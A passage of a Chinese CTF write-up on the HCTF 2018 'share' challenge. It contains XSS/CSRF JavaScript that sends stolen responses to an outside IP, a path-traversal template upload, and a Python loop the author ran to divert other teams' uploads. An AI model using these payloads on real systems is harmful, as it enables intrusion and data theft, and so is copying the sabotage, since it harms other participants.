        t.setRequestHeader("Content-type", "text/plain"),
        t.onreadystatechange = function() {
            4 == t.readyState && t.status
        },
        t.send(e);
    }
    function submitRequest(authenticity_token)
    {
        authenticity_token = authenticity_token.replace(/\+/g, "%2b");
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/file/Alpha_test", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.setRequestHeader("Referer", "http://share.2018.hctf.io/home/addtest");
        xhr.setRequestHeader("Origin", "http://share.2018.hctf.io");
        xhr.onload=function(evt){
          var data = evt.target.responseText;
          send(data);
        } 
        xhr.send("utf8=%E2%9C%93&authenticity_token="+authenticity_token+"&uid=30&fid=42&commit=submit");
    }
    function gettoken(){
        var t = new XMLHttpRequest;
        t.open("GET", "/home/addtest", !0),
        t.setRequestHeader("Content-type", "text/plain"),
        t.onreadystatechange = function() {
            4 == t.readyState && t.status
        },
        t.onload=function(evt){
          var data = evt.target.responseText;
          regex = /
可以很明了的看出来，需要通过上传模板，然后进行包含。但是查询资料发现如下。
也就是说，上传文件，必须上传到/app/views/home目录下。此时才可以进行包含。
话说之前一直傻在这里了，否则早就出了。先说下正确做法吧。
    文件名：../../app/views/home/test.erb
    文件内容：
编码后上传即可。此时便实现了跨目录上传。然后获取到文件名后，通过
    http://share.2018.hctf.io/home?page=te20181110-328-zexae3
即可成功包含，获取flag。
## 搅屎
做完题目后，在和出题人沟通时，意外得知了一个好玩的。
fid只可以给一次，那么，我可以通过监听，来做到，只要出现新文件，立马给到我的账号。这样别人永远无法获得上传文件。想法很棒，但是现实却很真实，自己第二天写wp才想到要搅屎，此时复现时发现有一个队在做。加紧写出了搅屎代码。然而没卵用，刚写好，跑起来。看见那边二血已经到手。
但最后还是再服务器跑着，以防三血诞生。但是，好像并没有人继续做下去了。
    import requests
    import re
    import time
    payload="""
    function send(e) {
        var t = new XMLHttpRequest;
        t.open("POST", "//139.199.107.193:2017", !0),
        t.setRequestHeader("Content-type", "text/plain"),
        t.onreadystatechange = function() {
            4 == t.readyState && t.status
        },
        t.send(e);
    }
    function submitRequest(authenticity_token)
    {
        authenticity_token = authenticity_token.replace(/\+/g, "%2b");
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/file/Alpha_test", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.setRequestHeader("Referer", "http://share.2018.hctf.io/home/addtest");
        xhr.setRequestHeader("Origin", "http://share.2018.hctf.io");
        xhr.onload=function(evt){
          var data = evt.target.responseText;
          send(data);
        } 
        xhr.send("utf8=%E2%9C%93&authenticity_token="+authenticity_token+"&uid={{uid}}}&fid={{fid}}&commit=submit");
    }
    function gettoken(){
        var t = new XMLHttpRequest;
        t.open("GET", "/home/addtest", !0),
        t.setRequestHeader("Content-type", "text/plain"),
        t.onreadystatechange = function() {
            4 == t.readyState && t.status
        },
        t.onload=function(evt){
          var data = evt.target.responseText;
          regex = /
    """
    headers={
        "Cookie": "_ga=GA1.2.1234049971.1541560268; _gid=GA1.2.395925356.1541764703; _hctf_session=IDl7oRVicLrzfQVGJ32JMMAL%2FkFQRZIqFGC4Az6xEzV2PW%2FG5JHNkaPTCL8McBALbeLexyWC9ltWt%2FU0XAbxnEihvGIQnvvZagnW%2F1I37tAXwbmKG9XUlOp2tkeXTNfVYIIhhzQGiFbfUFFhf2n%2BGRrcw9eu7Tnyn89bsI4fZCvSYgRrZCJJaZGJ%2BaDH8sFoaB1n1spPkQ7%2BHZoCdFdGN9PLPKWv9It3G5UL--FtVXtYfT0mQLejyc--cPeuwvnr0YSug5Ie0XwZCA%3D%3D"
    }
    def sendshi(uid,fid):
        headers={
            "Cookie": "_ga=GA1.2.1234049971.1541560268; _gid=GA1.2.395925356.1541764703; _hctf_session=Zt95n%2BqsePGzFV500lXzBLPBbtLVXQNhqypxEw%2Bw%2BrP9Pko9k%2B9jcXuB15FZ27ahSD18NhwxMn2dU7vT9U4GUy%2FIK1Ph2XxeYXNImY36jCqhjYfAlmzIy7hmBkU4MUxC9Y54%2FYCY9s6NOYACi1ZOeXBUmIlw8f1d6TyKQBmn4pRbQkiSRWRRFezqPS8iKpZ%2Bl4B7ZLnwZPky7NC%2BvUTGk5YjTpMZIAdITA88--WH67dwY%2FiXpMn013--hYBC7B4fWamLvU9%2BxFJCAw%3D%3D"
            }
        url="http://share.2018.hctf.io/recommend/to_admin"
        data={
        "utf8":"%E2%9C%93",
        "authenticity_token":"sK5IwUnkg2m2dVlQHb3DH4/XRQnHlz2BFWz7fEFSYSFhRjtL3cqWBJLd8+qrKwRzSe+4+nQ/lt8NlACosshm9g==",
        "context":payload.replace("{{uid}}",uid).replace("{{fid}}",fid),
        "url":"",
        "commit":"submit"
        }
        r = requests.post(url,data=data,headers=headers,timeout=3)
        print r.status_code
    url="http://share.2018.hctf.io/home/Alphatest"
    fid=0
    uid=0
    while(1):
        try:
            r=requests.get(url,headers=headers,timeout=3)
            pattern = re.compile(r'file number:(\d+) your uid: (\d+)')
            result1 = pattern.findall(r.text)
            if(fid != result1[0][0]):
                fid=result1[0][0]
                uid=result1[0][1]
            else:
                time.sleep(1)
                print(result1)
                contine
            sendshi(result1[0][1],result1[0][0])
            time.sleep(1)
        except:
            time.sleep(1)
## 两个不明白的地方
### Tempfile跨目录 (SOLVED)
自己之前一直在纠结可能有其他点，因为之前自己测试的时候，通过../会导致500错误。可能也是因为那一夜，自己有点懵。被500吓怕了。所以往后一直在通过自己本地ruby来测试如何绕过。
测试期间发现。
    share = Tempfile.new(name,path)
其中path中，可以用../跨目录，但是name中的斜杠，会被自动删掉，很迷。
然而题目中的可控点又是在name中。
    name = Base64.decode64(file.original_filename)
    ext = name.split('.')[-1] 
    share = Tempfile.new(
         name.split('.'+ext)[0],
         Rails.root.to_s+"/public/upload"
     )
所以导致自己把思路放在了这边，没有再次远程尝试。
甚至还动摇了，怀疑page的点没有找到。
最后才发现自己环境不对，两次测试环境，一次是2.3.7，另一次是2.5.3.....
一开始考虑到可能是这个CVE-2018-6914，但是他描述中写的是目录，也就想当然是我以上那个path。
**最后用2.5.0终于复现成功**
一键ruby环境....
    sudo docker run -dit --rm ruby:2.5.0
### render template之谜 (SOLVED)
如果正常理解以上代码，就是限制包含home控制器下的文件。
但是事实上按照出题给的hint1
如下两个链接包含后都很迷。
    http://share.2018.hctf.io/home?page=index
    http://share.2018.hctf.io/home?page=../layouts/mailer
首先是第一个index.html.erb，可以假设理解为他的代码存在问题，导致500。（包含失败也是500）
接下来的第二个就更迷了，既然限制了home，为什么还能跳去layouts。当时有点纠结这个问题，导致思维有点乱，心态也有所干扰。
**赛后自己尝试了一下。发现只要是views内的内容都可以进行包含。也就是说那个控制器限定没个卵用，但是必须在视图文件夹内。**
那么，可以总结一下。
    # 可以渲染任意路径文件
    render "path"
    render file: "path" 
    # 仅能渲染当前项目下 app/views内的任何内容
    render template: "products/show"
## 参考资料
  * [Rails 布局和视图渲染](https://ruby-china.github.io/rails-guides/layouts_and_rendering.html)
  * [利用csrf漏洞上传文件](https://www.freebuf.com/articles/web/17854.html)
  * [ezXSS](https://github.com/ssl/ezXSS)
  * [Tempfile](https://ruby-doc.org/stdlib-2.5.0/libdoc/tempfile/rdoc/Tempfile.html)
  * [Rails Dynamic Render 远程命令执行漏洞 (CVE-2016-0752)](https://www.seebug.org/vuldb/ssvid-90633)
  * [CVE-2018-6914: tempfile 和 tmpdir 库中意外创建文件和目录的缺陷](https://www.ruby-lang.org/zh_cn/news/2018/03/28/unintentional-file-and-directory-creation-with-directory-traversal-cve-2018-6914/)